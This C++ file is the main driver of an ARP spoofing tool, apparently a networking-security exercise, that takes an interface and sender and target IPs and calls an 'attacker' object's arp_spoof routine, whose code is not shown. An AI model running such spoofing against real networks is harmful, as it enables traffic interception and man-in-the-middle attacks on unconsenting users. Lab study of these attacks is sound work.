#include <iostream>
#include <arpa/inet.h>
#include "filter.h"
#include "utils.h"
#include "agent.h"
#include "ether.h"
#include "arp.h"

void usage(){
    std::cout << "Usage: ./send_arp <interface> <sender ip> <target ip>" << std::endl;
    std::cout << "Example: ./send_arp wlan0 176.12.93.12 172.30.19.18" << std::endl;
}

int main(int argc, char *argv[]){
    if(argc<4){
        usage();
        return -1;
    }

    char *interface = argv[1];
    char *sender_ip = argv[2];
    char *target_ip = argv[3];

    Agent sender = Agent();
    Agent target = Agent();
    Agent attacker = Agent(interface);      
    Xpkt xpkt = Xpkt();                     // general packet object

    sender.set_ip_str(sender_ip);
    target.set_ip_str(target_ip);

    std::cout << "[Input]" << std::endl;
    std::cout << "Interface: " << interface << std::endl;
    std::cout << "Sender IP: " << sender_ip << std::endl;
    std::cout << "Target IP: " << target_ip << std::endl;
    std::cout << std::endl;

    // Do ARP spoof
    if(attacker.arp_spoof(&sender, &target)){
        std::cout << "Spoofing success" << std::endl;
    }
}